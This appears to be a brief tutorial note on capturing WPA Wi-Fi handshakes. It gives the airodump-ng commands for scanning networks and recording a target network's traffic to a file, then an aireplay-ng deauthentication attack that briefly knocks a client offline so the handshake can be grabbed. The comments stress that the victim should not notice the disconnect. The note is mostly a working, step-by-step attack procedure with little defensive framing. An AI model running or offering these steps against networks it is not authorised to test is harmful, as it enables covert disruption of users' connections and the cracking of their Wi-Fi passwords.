# Capturing Handshake

1. Handshake Packet: four packets transferred between a client and the router when the client connects to the network
```
# 1. use airodump-ng to get all the networks around
airodump-ng [interface name] (--band abg)

# 2. Apply airodump-ng on target network and store the data in a file
airodump-ng --bssid [bssid of target network] --channel [channel of target network] --write [storing file name] (-D) [interface name]
# we need to wait until a new client connect to the network, once a new client connects we will see from the top that WPA handshake has been captured
# However, we can use a deauthentication attack because we know with that attack, a client will disconnect from that network so we can do this in a very short time.

# 3. Use deauth attack to facilitate the procedure
aireplay-ng --deauth 4 -a [bssid of target network] -c [bssid of client] [interface name]
# since number 4 is very small, the client will be disconnected for a very short time which they won't even feel that they got disconnected.

# 4. Since we have the handshake, we can quit the airodump-ng
```

